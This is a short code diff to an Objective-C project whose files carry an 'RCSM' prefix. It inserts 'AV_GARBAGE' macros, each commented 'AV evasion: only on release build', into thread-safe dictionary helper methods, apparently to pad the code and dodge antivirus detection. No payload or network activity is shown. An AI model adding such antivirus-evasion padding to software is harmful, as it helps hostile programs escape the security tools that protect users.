@@ -15,13 +15,17 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 @implementation NSMutableDictionary (ThreadSafety)
 
 - (void)threadSafeSetObject: (id)anObject
                      forKey: (id)aKey
                   usingLock: (NSLock *)aLock
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [aLock lock];
   [[anObject retain] autorelease];
   [self setObject: anObject
@@ -31,7 +35,10 @@
 
 - (void)threadSafeRemoveObjectForKey: (id)aKey
                            usingLock: (NSLock *)aLock
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [aLock lock];
   [self removeObjectForKey: aKey];
   [aLock unlock];
@@ -41,6 +48,9 @@
                    usingLock: (NSLock *)aLock
 {
   id result;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [aLock lock];
   result = [self objectForKey: aKey];
